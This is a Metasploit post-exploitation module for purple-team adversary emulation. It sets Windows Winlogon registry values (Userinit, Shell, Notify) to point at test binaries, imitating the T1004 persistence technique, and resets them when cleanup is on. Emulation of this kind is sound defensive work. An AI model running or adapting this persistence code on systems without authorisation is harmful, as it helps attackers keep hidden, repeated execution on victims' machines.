##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Exploit::FileDropper
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Registry

  # BASE_KEY="HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\"


  def initialize(info={})
    super(update_info(info,
        'Name'          => 'Winlogon Helper DLL (T1004) Windows - Purple Team',
        'Description'   => %q{
            Persistence:
            Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in HKLM\Software[Wow6432Node]Microsoft\Windows NT\CurrentVersion\Winlogon\ and HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\ are used to manage additional helper programs and functionalities that support Winlogon.

            Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse:

            Winlogon\Notify - points to notification package DLLs that handle Winlogon events
            Winlogon\Userinit - points to userinit.exe, the user initialization program executed when a user logs on
            Winlogon\Shell - points to explorer.exe, the system shell executed when a user logs on
            Adversaries may take advantage of these features to repeatedly execute malicious code and establish Persistence.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Praetorian' ],
        'Platform'      => [ 'win' ],
        'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1004' ] ],
        'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
      [
        OptInt.new('METHOD', [true, "1=Userinit Key, 2=Winlogon Shell Key, 3=Winlogon Notify Key, 0=all", 1]),
        OptBool.new("CLEANUP", [true, "Remove registry keys after execution", true])
      ])
  end


  # TODO, upload binaries and get them to run instead of just changing the registry
  def run
    begin
      raise "Module requires meterpreter session" unless session.type == "meterpreter"
      raise "Requires admin" unless is_admin?
      method = datastore['METHOD']
      methods = [1, 2, 3]
      if method != 0
        methods = []
        methods.push(method)
      end

      methods.each{ |ttp_method|
        if ttp_method == 1
          t1004_execute("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\", "UserInit", "Userinit.exe, C:\\t1004.exe", "Userinit.exe")
        elsif ttp_method == 2
          t1004_execute("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\", "Shell", "explorer.exe, C:\\t1004.exe", "explorer.exe")
        elsif ttp_method == 3
          t1004_execute("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\", "Notify", "C:\\t1004.dll", "")
        else
          raise "Invalid method of execution selected."
        end
      }

      print_good("Module T1004W execution succesful.")
    rescue ::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("Module T1004W execution failed.")
    end
  end

  def t1004_execute(base_key, reg_key, val, old_val)
    reg_modify(base_key, reg_key, val)
    print_good("set #{base_key}#{reg_key} to \"#{registry_getvaldata(base_key, reg_key)}\"")
    if datastore['CLEANUP']
      print_warning("Cleaning up. This will remove the registry change")
      reg_modify(base_key, reg_key, old_val)
    end
  end

  def reg_modify(base_key, reg_name, value)
    registry_setvaldata(base_key, reg_name, value, "REG_SZ")
  end
end
